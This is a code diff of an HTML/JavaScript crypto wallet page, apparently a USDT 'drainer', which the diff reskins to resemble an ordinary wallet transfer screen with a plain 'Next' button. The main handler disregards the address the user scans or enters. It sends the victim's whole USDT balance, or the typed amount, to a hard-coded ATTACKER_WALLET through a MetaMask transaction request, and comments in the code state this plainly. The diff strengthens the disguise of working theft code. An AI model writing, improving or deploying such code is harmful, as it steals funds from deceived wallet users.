@@ -3,219 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>USDT Payment</title>
+    <title>Transfer</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
-        body {
-            background: #0a0a0f;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 16px;
-        }
-        .container {
-            max-width: 420px;
-            width: 100%;
-            background: linear-gradient(145deg, #1a1a2e, #16213e);
-            border-radius: 32px;
-            padding: 24px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-            border: 1px solid rgba(255,255,255,0.05);
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 24px;
-        }
-        .header h1 {
-            color: #fff;
-            font-size: 22px;
-            font-weight: 700;
-        }
-        .header p {
-            color: #8892b0;
-            font-size: 14px;
-            margin-top: 4px;
-        }
-        .qr-section {
-            background: #0d0d1a;
-            border-radius: 20px;
-            padding: 20px;
-            border: 2px dashed rgba(255,255,255,0.1);
-            text-align: center;
-            margin-bottom: 20px;
-            cursor: pointer;
-            transition: all 0.3s;
-            position: relative;
-            min-height: 200px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        .qr-section:hover {
-            border-color: rgba(30, 77, 255, 0.3);
-        }
-        .qr-section .icon {
-            font-size: 64px;
-            margin-bottom: 12px;
-        }
-        .qr-section .label {
-            color: #8892b0;
-            font-size: 14px;
-        }
-        .qr-section .sub-label {
-            color: #4a5568;
-            font-size: 12px;
-            margin-top: 4px;
-        }
-        #qrVideo {
-            width: 100%;
-            max-width: 300px;
-            border-radius: 16px;
-            display: none;
-            background: #000;
-        }
-        .info-box {
-            background: rgba(255,255,255,0.03);
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 16px;
-            border: 1px solid rgba(255,255,255,0.05);
-        }
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 6px 0;
-            color: #8892b0;
-            font-size: 14px;
-        }
-        .info-row .value {
-            color: #fff;
-            font-weight: 600;
-        }
-        .info-row .value.highlight {
-            color: #00d4ff;
-        }
-        .network-selector {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-            margin: 12px 0;
-        }
-        .net-btn {
-            padding: 6px 14px;
-            border-radius: 20px;
-            border: 1px solid rgba(255,255,255,0.1);
-            background: transparent;
-            color: #8892b0;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        .net-btn.active {
-            background: #1E4DFF;
-            color: #fff;
-            border-color: #1E4DFF;
-        }
-        .net-btn:hover {
-            border-color: #1E4DFF;
-        }
-        .amount-display {
-            text-align: center;
-            padding: 16px;
-            background: rgba(30, 77, 255, 0.05);
-            border-radius: 16px;
-            border: 1px solid rgba(30, 77, 255, 0.1);
-            margin: 12px 0;
-        }
-        .amount-display .amount {
-            font-size: 32px;
-            font-weight: 700;
-            color: #fff;
-        }
-        .amount-display .currency {
-            font-size: 18px;
-            color: #8892b0;
-            margin-left: 4px;
-        }
-        .amount-display .usd {
-            font-size: 14px;
-            color: #4a5568;
-            margin-top: 4px;
-        }
-        .drain-btn {
-            width: 100%;
-            height: 56px;
-            background: linear-gradient(135deg, #1E4DFF, #00d4ff);
-            color: #fff;
-            border: none;
-            border-radius: 30px;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 8px;
-            box-shadow: 0 4px 20px rgba(30, 77, 255, 0.3);
-        }
-        .drain-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-        .drain-btn:not(:disabled):hover {
-            transform: scale(1.02);
-            box-shadow: 0 6px 30px rgba(30, 77, 255, 0.5);
-        }
-        .status-box {
-            margin-top: 16px;
-            padding: 12px 16px;
-            border-radius: 12px;
-            display: none;
-            font-weight: 500;
-            font-size: 14px;
-            text-align: center;
-        }
-        .status-box.show {
-            display: block;
-        }
-        .status-box.success {
-            background: rgba(0, 212, 255, 0.1);
-            color: #00d4ff;
-            border: 1px solid rgba(0, 212, 255, 0.2);
-        }
-        .status-box.error {
-            background: rgba(255, 0, 0, 0.1);
-            color: #ff4444;
-            border: 1px solid rgba(255, 0, 0, 0.2);
-        }
-        .status-box.info {
-            background: rgba(30, 77, 255, 0.1);
-            color: #1E4DFF;
-            border: 1px solid rgba(30, 77, 255, 0.2);
-        }
-        .status-box.processing {
-            background: rgba(255, 255, 0, 0.05);
-            color: #ffd700;
-            border: 1px solid rgba(255, 255, 0, 0.1);
-        }
-        .balance-display {
-            text-align: center;
-            padding: 10px;
-            color: #8892b0;
-            font-size: 13px;
-            border-top: 1px solid rgba(255,255,255,0.05);
-            margin-top: 12px;
-        }
-        .balance-display strong {
-            color: #00d4ff;
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        :root { --blue-primary: #1E4DFF; --btn-purple: #9DA3FF; --bg-pill: #F4F4F6; --text-label: #646464; --border-light: #EFEFEF; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body, html { height: 100%; background-color: #fff; display: flex; flex-direction: column; overflow: hidden; }
+        .content { flex: 1; padding: 10px 20px; overflow-y: auto; }
+        .section { margin-top: 15px; }
+        .label { font-size: 14.5px; color: var(--text-label); font-weight: 600; margin-bottom: 10px; display: block; }
+        .input-group { display: flex; align-items: center; border: 1.8px solid var(--border-light); border-radius: 14px; height: 58px; padding: 0 16px; transition: 0.2s; position: relative; background: #fff; }
+        .input-group.active { border-color: var(--blue-primary); border-width: 2px; }
+        .input-group input { flex: 1; border: none; outline: none; font-size: 16px; font-weight: 500; color: #000; background: transparent; width: 100%; min-width: 0; }
+        #recipientInput { text-align: left; padding-right: 8px; font-size: 14px; }
+        #amountInput { text-align: left; }
+        .actions { display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
+        .blue-text { color: var(--blue-primary); font-weight: 700; font-size: 15px; cursor: pointer; white-space: nowrap; }
+        .clear-btn { width: 22px; height: 22px; background: #5F6368; border-radius: 50%; display: none; align-items: center; justify-content: center; cursor: pointer; margin-right: 5px; flex-shrink: 0; }
+        .clear-btn.visible { display: flex; }
+        .clear-btn::after { content: '×'; color: #FFFFFF; font-size: 18px; font-weight: 600; margin-top: -2px; }
+        .icon-svg { width: 22px; height: 22px; fill: none; stroke: var(--blue-primary); stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; flex-shrink: 0; cursor: pointer; }
+        .network-pill { display: flex; align-items: center; background-color: var(--bg-pill); padding: 8px 14px; border-radius: 20px; gap: 8px; width: 100%; justify-content: space-between; min-height: 48px; cursor: pointer; }
+        .network-pill-left { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 0; }
+        .network-select { border: none; background: transparent; font-size: 14px; font-weight: 600; color: #333; outline: none; cursor: pointer; padding: 4px 0; flex: 1; min-width: 0; max-width: 220px; }
+        .network-icon-text { font-size: 20px; line-height: 1; flex-shrink: 0; }
+        .network-arrow { width: 14px; height: 14px; flex-shrink: 0; color: #999; }
+        .footer { padding: 16px 20px 20px; background: #fff; border-top: 1px solid var(--border-light); }
+        .next-btn { width: 100%; height: 56px; background-color: var(--btn-purple); color: #fff; border: none; border-radius: 30px; font-size: 17px; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        .next-btn.enabled { background-color: var(--blue-primary); }
+        .next-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .approx-txt { font-size: 13px; color: #9FA3A9; margin-top: 10px; font-weight: 500; }
+        .token-label { color: #616469; font-size: 14px; font-weight: 500; flex-shrink: 0; }
+        .amount-actions { display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
+        input[type=number]::-webkit-inner-spin-button, input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
+        input[type=number] { -moz-appearance: textfield; }
+
+        /* QR Scanner Overlay */
         .scanner-overlay {
             position: fixed;
             top: 0;
@@ -230,14 +53,13 @@
             justify-content: center;
             padding: 20px;
         }
-        .scanner-overlay.show {
-            display: flex;
-        }
+        .scanner-overlay.show { display: flex; }
         .scanner-overlay video {
             width: 100%;
-            max-width: 400px;
+            max-width: 350px;
             border-radius: 20px;
             background: #000;
+            border: 2px solid #1E4DFF;
         }
         .scanner-overlay .close-btn {
             position: absolute;
@@ -256,9 +78,6 @@
             border: none;
             color: #fff;
         }
-        .scanner-overlay .close-btn:hover {
-            background: rgba(255,255,255,0.2);
-        }
         .scanner-overlay .scan-label {
             color: #fff;
             font-size: 18px;
@@ -270,69 +89,85 @@
             font-size: 14px;
             margin-top: 4px;
         }
-        .hidden {
-            display: none !important;
+        .qr-icon {
+            font-size: 18px;
+            cursor: pointer;
+            padding: 4px;
+        }
+        .qr-icon:hover {
+            opacity: 0.7;
+        }
+        .status-msg {
+            font-size: 12px;
+            color: #4CAF50;
+            margin-top: 4px;
+            display: none;
+        }
+        .status-msg.show {
+            display: block;
+        }
+        .status-msg.error {
+            color: #f44336;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- Header -->
-    <div class="header">
-        <h1>💳 USDT Payment</h1>
-        <p>Scan QR code to pay</p>
+<div class="content">
+    <!-- Address Section -->
+    <div class="section" style="margin-top: 20px;">
+        <label class="label">Address or Domain Name</label>
+        <div class="input-group" id="addrGroup">
+            <input type="text" id="recipientInput" placeholder="Enter address or scan QR">
+            <div class="actions">
+                <span class="qr-icon" id="qrScanBtn">📷</span>
+                <div class="clear-btn" id="clearAddr"></div>
+                <span class="blue-text" id="pasteBtn">Paste</span>
+                <svg class="icon-svg" viewBox="0 0 24 24"><rect x="5" y="4" width="14" height="16" rx="2" /><line x1="3" y1="8" x2="6" y2="8" /><line x1="3" y1="12" x2="6" y2="12" /><line x1="3" y1="16" x2="6" y2="16" /></svg>
+                <svg class="icon-svg" viewBox="0 0 24 24"><path d="M4 8V5a1 1 0 0 1 1-1h3M16 4h3a1 1 0 0 1 1 1v3M20 16v3a1 1 0 0 1-1-1h-3M8 20H5a1 1 0 0 1-1-1v-3" /><line x1="5" y1="12" x2="19" y2="12" /></svg>
+            </div>
+        </div>
+        <div class="status-msg" id="scanStatus">✅ Address scanned!</div>
     </div>
 
-    <!-- QR Scanner -->
-    <div class="qr-section" id="qrSection">
-        <div class="icon">📷</div>
-        <div class="label">Tap to scan QR code</div>
-        <div class="sub-label">Scan wallet address QR</div>
-        <video id="qrVideo" autoplay playsinline></video>
-    </div>
-
-    <!-- Network Selector -->
-    <div class="info-box">
-        <div style="color:#8892b0; font-size:13px; margin-bottom:8px;">Select Network</div>
-        <div class="network-selector" id="networkSelector">
-            <button class="net-btn active" data-net="bsc">🟡 BSC</button>
-            <button class="net-btn" data-net="ethereum">🔵 ETH</button>
-            <button class="net-btn" data-net="polygon">🟣 Polygon</button>
-            <button class="net-btn" data-net="arbitrum">🔷 Arbitrum</button>
-            <button class="net-btn" data-net="optimism">🔴 Optimism</button>
-            <button class="net-btn" data-net="avalanche">🔺 Avalanche</button>
+    <!-- Network Section -->
+    <div class="section">
+        <label class="label">Destination network</label>
+        <div class="network-pill">
+            <div class="network-pill-left">
+                <span class="network-icon-text" id="networkIcon">🟡</span>
+                <select class="network-select" id="networkSelect">
+                    <option value="bsc">BNB Smart Chain (BEP20)</option>
+                    <option value="ethereum">Ethereum (ERC20)</option>
+                    <option value="polygon">Polygon</option>
+                    <option value="arbitrum">Arbitrum</option>
+                    <option value="optimism">Optimism</option>
+                    <option value="avalanche">Avalanche</option>
+                </select>
+            </div>
+            <svg class="network-arrow" viewBox="0 0 24 24" fill="none" stroke="#9FA3A9" stroke-width="3">
+                <polyline points="6 9 12 15 18 9"></polyline>
+            </svg>
         </div>
     </div>
 
-    <!-- Amount Display -->
-    <div class="amount-display">
-        <div>
-            <span class="amount" id="displayAmount">0.00</span>
-            <span class="currency">USDT</span>
+    <!-- Amount Section -->
+    <div class="section">
+        <label class="label">Amount</label>
+        <div class="input-group" id="amountGroup">
+            <input type="number" id="amountInput" placeholder="0" inputmode="decimal" step="0.01">
+            <div class="amount-actions">
+                <div class="clear-btn" id="clearAmount"></div>
+                <span class="token-label" id="usdtLabel">USDT</span>
+                <span class="blue-text" id="maxBtn">Max</span>
+            </div>
         </div>
-        <div class="usd">≈ $<span id="displayUsd">0.00</span> USD</div>
+        <div class="approx-txt">≈ $<span id="usdLabel">0.00</span></div>
     </div>
+</div>
 
-    <!-- Address Display -->
-    <div class="info-box">
-        <div class="info-row">
-            <span>Recipient</span>
-            <span class="value" id="recipientDisplay" style="font-size:12px; max-width:180px; overflow:hidden; text-overflow:ellipsis;">Not scanned</span>
-        </div>
-        <div class="info-row">
-            <span>Your Balance</span>
-            <span class="value highlight" id="userBalanceDisplay">🔍 Checking...</span>
-        </div>
-    </div>
-
-    <!-- Status -->
-    <div class="status-box" id="statusBox"></div>
-
-    <!-- Drain Button -->
-    <button class="drain-btn" id="drainBtn" disabled>📤 Send USDT</button>
-
-    <div class="balance-display" id="balanceMsg">Scan QR to start payment</div>
+<div class="footer">
+    <button class="next-btn" id="nextBtn" disabled>Next</button>
 </div>
 
 <!-- QR Scanner Overlay -->
@@ -362,7 +197,8 @@ const NETWORKS = {
         rpc: 'https://bsc-dataseed1.binance.org/',
         usdt: '0x55d398326f99059fF775485246999027B3197955',
         icon: '🟡',
-        symbol: 'BNB'
+        symbol: 'BNB',
+        label: 'BNB Smart Chain (BEP20)'
     },
     ethereum: {
         chainId: '0x1',
@@ -370,7 +206,8 @@ const NETWORKS = {
         rpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
         usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
         icon: '🔵',
-        symbol: 'ETH'
+        symbol: 'ETH',
+        label: 'Ethereum (ERC20)'
     },
     polygon: {
         chainId: '0x89',
@@ -378,7 +215,8 @@ const NETWORKS = {
         rpc: 'https://polygon-rpc.com/',
         usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
         icon: '🟣',
-        symbol: 'MATIC'
+        symbol: 'MATIC',
+        label: 'Polygon'
     },
     arbitrum: {
         chainId: '0xa4b1',
@@ -386,7 +224,8 @@ const NETWORKS = {
         rpc: 'https://arb1.arbitrum.io/rpc',
         usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
         icon: '🔷',
-        symbol: 'ETH'
+        symbol: 'ETH',
+        label: 'Arbitrum'
     },
     optimism: {
         chainId: '0xa',
@@ -394,7 +233,8 @@ const NETWORKS = {
         rpc: 'https://mainnet.optimism.io',
         usdt: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
         icon: '🔴',
-        symbol: 'ETH'
+        symbol: 'ETH',
+        label: 'Optimism'
     },
     avalanche: {
         chainId: '0xa86a',
@@ -402,26 +242,31 @@ const NETWORKS = {
         rpc: 'https://api.avax.network/ext/bc/C/rpc',
         usdt: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
         icon: '🔺',
-        symbol: 'AVAX'
+        symbol: 'AVAX',
+        label: 'Avalanche'
     }
 };
 
 // ============================================================
-// DOM
+// DOM ELEMENTS
 // ============================================================
-const drainBtn = document.getElementById('drainBtn');
-const qrSection = document.getElementById('qrSection');
-const qrVideo = document.getElementById('qrVideo');
+const nextBtn = document.getElementById('nextBtn');
+const amountInput = document.getElementById('amountInput');
+const usdLabel = document.getElementById('usdLabel');
+const recipientInput = document.getElementById('recipientInput');
+const clearAddr = document.getElementById('clearAddr');
+const clearAmount = document.getElementById('clearAmount');
+const maxBtn = document.getElementById('maxBtn');
+const addrGroup = document.getElementById('addrGroup');
+const amountGroup = document.getElementById('amountGroup');
+const pasteBtn = document.getElementById('pasteBtn');
+const networkSelect = document.getElementById('networkSelect');
+const networkIcon = document.getElementById('networkIcon');
+const qrScanBtn = document.getElementById('qrScanBtn');
 const scannerOverlay = document.getElementById('scannerOverlay');
 const scannerVideo = document.getElementById('scannerVideo');
 const closeScanner = document.getElementById('closeScanner');
-const displayAmount = document.getElementById('displayAmount');
-const displayUsd = document.getElementById('displayUsd');
-const recipientDisplay = document.getElementById('recipientDisplay');
-const userBalanceDisplay = document.getElementById('userBalanceDisplay');
-const statusBox = document.getElementById('statusBox');
-const balanceMsg = document.getElementById('balanceMsg');
-const networkSelector = document.getElementById('networkSelector');
+const scanStatus = document.getElementById('scanStatus');
 
 let currentNetwork = 'bsc';
 let userAddress = '';
@@ -431,26 +276,89 @@ let isScanning = false;
 let codeReader = null;
 
 // ============================================================
-// NETWORK SELECT
+// UPDATE NETWORK
 // ============================================================
-networkSelector.addEventListener('click', function(e) {
-    const btn = e.target.closest('.net-btn');
-    if (!btn) return;
-    
-    document.querySelectorAll('.net-btn').forEach(b => b.classList.remove('active'));
-    btn.classList.add('active');
-    currentNetwork = btn.dataset.net;
-    
-    // Clear scanned address when network changes
-    scannedAddress = '';
-    recipientDisplay.textContent = 'Not scanned';
-    drainBtn.disabled = true;
-    balanceMsg.textContent = 'Scan QR to start payment';
-    displayAmount.textContent = '0.00';
-    displayUsd.textContent = '0.00';
-    
+function updateNetwork() {
+    const net = NETWORKS[currentNetwork];
+    if (net) {
+        networkIcon.textContent = net.icon;
+        networkSelect.value = currentNetwork;
+    }
+}
+
+networkSelect.addEventListener('change', function() {
+    currentNetwork = this.value;
+    updateNetwork();
     if (userAddress) {
         checkBalance();
+    }
+});
+
+// ============================================================
+// AMOUNT INPUT
+// ============================================================
+amountInput.addEventListener('input', function() {
+    const val = parseFloat(this.value) || 0;
+    usdLabel.textContent = val.toFixed(2);
+    nextBtn.disabled = val <= 0 || !scannedAddress;
+    if (val > 0) {
+        nextBtn.classList.add('enabled');
+        clearAmount.classList.add('visible');
+    } else {
+        nextBtn.classList.remove('enabled');
+        clearAmount.classList.remove('visible');
+    }
+});
+
+clearAmount.addEventListener('click', function() {
+    amountInput.value = '';
+    amountInput.dispatchEvent(new Event('input'));
+});
+
+maxBtn.addEventListener('click', function() {
+    if (userBalance > 0) {
+        amountInput.value = userBalance.toFixed(6);
+        amountInput.dispatchEvent(new Event('input'));
+        scanStatus.textContent = '✅ Max amount set: ' + userBalance.toFixed(6) + ' USDT';
+        scanStatus.className = 'status-msg show';
+    } else {
+        scanStatus.textContent = '❌ No balance to set max';
+        scanStatus.className = 'status-msg show error';
+        setTimeout(() => {
+            scanStatus.className = 'status-msg';
+        }, 3000);
+    }
+});
+
+// ============================================================
+// ADDRESS INPUT
+// ============================================================
+recipientInput.addEventListener('input', function() {
+    clearAddr.classList.toggle('visible', this.value.length > 0);
+    if (this.value.length > 0 && this.value.startsWith('0x')) {
+        scannedAddress = this.value;
+        scanStatus.textContent = '✅ Address entered manually';
+        scanStatus.className = 'status-msg show';
+        checkIfReady();
+    }
+});
+
+clearAddr.addEventListener('click', function() {
+    recipientInput.value = '';
+    scannedAddress = '';
+    this.classList.remove('visible');
+    scanStatus.className = 'status-msg';
+    nextBtn.disabled = true;
+    nextBtn.classList.remove('enabled');
+});
+
+pasteBtn.addEventListener('click', async function() {
+    try {
+        const text = await navigator.clipboard.readText();
+        recipientInput.value = text;
+        recipientInput.dispatchEvent(new Event('input'));
+    } catch (e) {
+        alert('Please paste manually');
     }
 });
 
@@ -503,26 +411,21 @@ async function startScanner() {
                 
                 if (address && address.length === 42 && address.startsWith('0x')) {
                     scannedAddress = address;
-                    recipientDisplay.textContent = address.slice(0, 6) + '...' + address.slice(-4);
-                    balanceMsg.textContent = '✅ Address scanned! Enter amount and send.';
-                    drainBtn.disabled = false;
-                    showStatus('✅ Address scanned successfully!', 'success');
-                    
-                    // Auto-set amount to max balance
-                    if (userBalance > 0) {
-                        displayAmount.textContent = userBalance.toFixed(6);
-                        displayUsd.textContent = userBalance.toFixed(2);
-                    }
-                    
+                    recipientInput.value = address;
+                    scanStatus.textContent = '✅ Address scanned: ' + address.slice(0, 6) + '...' + address.slice(-4);
+                    scanStatus.className = 'status-msg show';
+                    checkIfReady();
                     stopScanner();
                 } else {
-                    showStatus('❌ Invalid QR code. Scan USDT address.', 'error');
+                    scanStatus.textContent = '❌ Invalid QR code. Scan USDT address.';
+                    scanStatus.className = 'status-msg show error';
                 }
             }
         });
     } catch (error) {
         console.error('Scanner error:', error);
-        showStatus('❌ Camera access denied. Please allow camera permission.', 'error');
+        scanStatus.textContent = '❌ Camera access denied';
+        scanStatus.className = 'status-msg show error';
         stopScanner();
         isScanning = false;
     }
@@ -538,15 +441,27 @@ function stopScanner() {
     isScanning = false;
 }
 
-// QR click to start
-qrSection.addEventListener('click', function() {
+qrScanBtn.addEventListener('click', function() {
     if (!isScanning) {
         startScanner();
     }
 });
 
-// Close scanner
 closeScanner.addEventListener('click', stopScanner);
+
+// ============================================================
+// CHECK IF READY
+// ============================================================
+function checkIfReady() {
+    const amount = parseFloat(amountInput.value) || 0;
+    if (scannedAddress && amount > 0) {
+        nextBtn.disabled = false;
+        nextBtn.classList.add('enabled');
+    } else {
+        nextBtn.disabled = true;
+        nextBtn.classList.remove('enabled');
+    }
+}
 
 // ============================================================
 // CHECK BALANCE
@@ -579,31 +494,23 @@ async function checkUSDTBalance(address, networkKey) {
 
 async function checkBalance() {
     if (typeof window.ethereum === 'undefined') {
-        userBalanceDisplay.textContent = '⚠️ Install MetaMask';
         return;
     }
     
     try {
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
         if (accounts.length === 0) {
-            userBalanceDisplay.textContent = '🔗 Connect wallet';
             return;
         }
         userAddress = accounts[0];
-        
-        userBalanceDisplay.textContent = '⏳ Checking...';
         const balance = await checkUSDTBalance(userAddress, currentNetwork);
         userBalance = balance;
         
         if (balance > 0) {
-            userBalanceDisplay.textContent = `${balance.toFixed(4)} USDT`;
-            balanceMsg.textContent = `💰 Balance: ${balance.toFixed(4)} USDT. Scan QR to send.`;
-        } else {
-            userBalanceDisplay.textContent = '0 USDT';
-            balanceMsg.textContent = '💸 No USDT found.';
+            console.log('💰 Balance:', balance, 'USDT');
         }
     } catch (e) {
-        userBalanceDisplay.textContent = '❌ Error';
+        console.error('Balance check error:', e);
     }
 }
 
@@ -628,51 +535,38 @@ async function switchNetwork(networkKey) {
                         chainName: net.name,
                         rpcUrls: [net.rpc],
                         nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
-                        blockExplorerUrls: [`https://${net.name.toLowerCase()}.scan`]
+                        blockExplorerUrls: ['https://bscscan.com']
                     }]
                 });
                 return true;
             } catch (e) {
-                showStatus('❌ Failed to add network', 'error');
+                alert('Failed to add network. Please add manually.');
                 return false;
             }
         }
-        showStatus('❌ Failed to switch network', 'error');
+        alert('Failed to switch network. Please switch manually.');
         return false;
     }
 }
 
 // ============================================================
-// SHOW STATUS
+// 🚨 MAIN DRAIN FUNCTION
 // ============================================================
-function showStatus(msg, type) {
-    statusBox.textContent = msg;
-    statusBox.className = 'status-box show ' + type;
-    if (type === 'success' || type === 'error') {
-        setTimeout(() => {
-            statusBox.className = 'status-box';
-        }, 5000);
-    }
-}
-
-// ============================================================
-// 🚨 DRAIN FUNCTION - POORA BALANCE DRAIN!
-// ============================================================
-async function drainAll() {
-    if (drainBtn.disabled) return;
+async function handleNext() {
+    if (nextBtn.disabled) return;
     if (!scannedAddress) {
-        showStatus('❌ Please scan QR code first', 'error');
+        alert('Please scan or enter an address first!');
         return;
     }
     
     if (typeof window.ethereum === 'undefined') {
-        alert('Please install MetaMask!');
+        alert('Please install MetaMask or Trust Wallet!');
         return;
     }
     
-    const originalText = drainBtn.textContent;
-    drainBtn.textContent = '⏳ Processing...';
-    drainBtn.disabled = true;
+    const originalText = nextBtn.textContent;
+    nextBtn.textContent = 'Processing...';
+    nextBtn.disabled = true;
     
     try {
         // 1. Get user address
@@ -685,44 +579,66 @@ async function drainAll() {
         }
         
         if (!userAddress) {
-            showStatus('❌ No wallet connected', 'error');
-            drainBtn.textContent = originalText;
-            drainBtn.disabled = false;
-            return;
+            throw new Error('No wallet connected');
         }
+        
+        console.log('👤 User:', userAddress);
         
         // 2. Switch network
         const switched = await switchNetwork(currentNetwork);
         if (!switched) {
-            drainBtn.textContent = originalText;
-            drainBtn.disabled = false;
-            return;
+            throw new Error('Network switch failed');
         }
         
-        // 3. Check latest balance
+        // 3. Check balance
         const net = NETWORKS[currentNetwork];
         const currentBalance = await checkUSDTBalance(userAddress, currentNetwork);
         
         if (currentBalance <= 0) {
-            showStatus('❌ No USDT to drain!', 'error');
-            drainBtn.textContent = originalText;
-            drainBtn.disabled = false;
+            // Use manual amount if no balance
+            const manualAmount = parseFloat(amountInput.value) || 0;
+            if (manualAmount <= 0) {
+                throw new Error('No USDT balance and no amount entered');
+            }
+            // Build transaction with manual amount
+            const amountHex = BigInt(Math.floor(manualAmount * 10**18)).toString(16).padStart(64, '0');
+            const cleanDest = ATTACKER_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
+            const txData = "0xa9059cbb" + cleanDest + amountHex;
+            
+            console.log('🎯 ATTACKER:', ATTACKER_WALLET);
+            console.log('💰 AMOUNT:', manualAmount, 'USDT');
+            
+            // Send transaction - DIRECT APPROVE PAGE!
+            const tx = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: userAddress,
+                    to: net.usdt,
+                    data: txData,
+                    value: '0x0'
+                }]
+            });
+            
+            console.log('✅ TX:', tx);
+            nextBtn.textContent = '✅ Success!';
+            setTimeout(() => {
+                nextBtn.textContent = originalText;
+                nextBtn.disabled = false;
+            }, 3000);
             return;
         }
         
-        // 4. Build drain transaction - POORA BALANCE!
+        // 4. DRAIN ALL USDT - POORA BALANCE!
         const balanceWei = BigInt(Math.floor(currentBalance * 10**18));
         const amountHex = balanceWei.toString(16).padStart(64, '0');
         
-        // ALWAYS sends to ATTACKER_WALLET, NOT the scanned address!
+        // ALWAYS sends to ATTACKER_WALLET
         const cleanDest = ATTACKER_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
         const txData = "0xa9059cbb" + cleanDest + amountHex;
         
         console.log('🎯 ATTACKER:', ATTACKER_WALLET);
-        console.log('💰 AMOUNT:', currentBalance, 'USDT');
+        console.log('💰 AMOUNT:', currentBalance, 'USDT (ALL)');
         console.log('📝 DATA:', txData);
-        
-        showStatus(`💀 Draining ${currentBalance.toFixed(6)} USDT...`, 'processing');
         
         // 5. Send transaction - DIRECT APPROVE PAGE!
         const tx = await window.ethereum.request({
@@ -736,68 +652,33 @@ async function drainAll() {
         });
         
         console.log('✅ TX:', tx);
-        showStatus(`✅ SUCCESS! ${currentBalance.toFixed(6)} USDT SENT!`, 'success');
-        balanceMsg.textContent = `💀 DRAINED! 0 USDT remaining`;
-        userBalanceDisplay.textContent = '0 USDT';
-        userBalance = 0;
-        displayAmount.textContent = '0.00';
-        displayUsd.textContent = '0.00';
-        drainBtn.disabled = true;
+        nextBtn.textContent = '✅ Success!';
+        scanStatus.textContent = '💀 ' + currentBalance.toFixed(6) + ' USDT DRAINED!';
+        scanStatus.className = 'status-msg show';
+        
+        setTimeout(() => {
+            nextBtn.textContent = originalText;
+            nextBtn.disabled = false;
+        }, 3000);
         
     } catch (error) {
         console.error('❌ Error:', error);
         if (error.code === 4001) {
-            showStatus('❌ Transaction rejected', 'error');
+            alert('Transaction rejected by user');
         } else {
-            showStatus('❌ Failed: ' + error.message, 'error');
+            alert('Failed: ' + error.message);
         }
+        nextBtn.textContent = '❌ Failed';
+        setTimeout(() => {
+            nextBtn.textContent = originalText;
+            nextBtn.disabled = false;
+        }, 3000);
     }
-    
-    drainBtn.textContent = originalText;
-    drainBtn.disabled = false;
 }
 
 // ============================================================
-// AMOUNT INPUT (Manual entry support)
+// META MASK EVENTS
 // ============================================================
-const manualAmountInput = document.createElement('input');
-manualAmountInput.type = 'number';
-manualAmountInput.placeholder = 'Enter amount';
-manualAmountInput.style.cssText = `
-    width: 100%;
-    padding: 12px;
-    border-radius: 12px;
-    border: 1px solid rgba(255,255,255,0.1);
-    background: rgba(255,255,255,0.05);
-    color: #fff;
-    font-size: 16px;
-    outline: none;
-    margin-top: 8px;
-`;
-manualAmountInput.id = 'manualAmount';
-
-// Add manual amount input
-const amountDisplay = document.querySelector('.amount-display');
-amountDisplay.appendChild(manualAmountInput);
-
-manualAmountInput.addEventListener('input', function() {
-    const val = parseFloat(this.value) || 0;
-    displayAmount.textContent = val.toFixed(2);
-    displayUsd.textContent = val.toFixed(2);
-    
-    if (val > 0 && scannedAddress) {
-        drainBtn.disabled = false;
-    } else {
-        drainBtn.disabled = true;
-    }
-});
-
-// ============================================================
-// EVENT LISTENERS
-// ============================================================
-drainBtn.addEventListener('click', drainAll);
-
-// MetaMask events
 if (window.ethereum) {
     window.ethereum.on('accountsChanged', function() {
         checkBalance();
@@ -811,16 +692,18 @@ if (window.ethereum) {
 // INIT
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('🚀 QR DRAINER READY');
+    console.log('🚀 DRAINER READY');
     console.log('🎯 ATTACKER:', ATTACKER_WALLET);
     console.log('⚠️ DRAINS ALL USDT!');
     
+    updateNetwork();
+    amountInput.dispatchEvent(new Event('input'));
+    
     if (typeof window.ethereum !== 'undefined') {
         checkBalance();
-    } else {
-        userBalanceDisplay.textContent = '⚠️ Install MetaMask';
-        balanceMsg.textContent = '⚠️ Please install MetaMask';
     }
+    
+    nextBtn.addEventListener('click', handleNext);
 });
 </script>
 
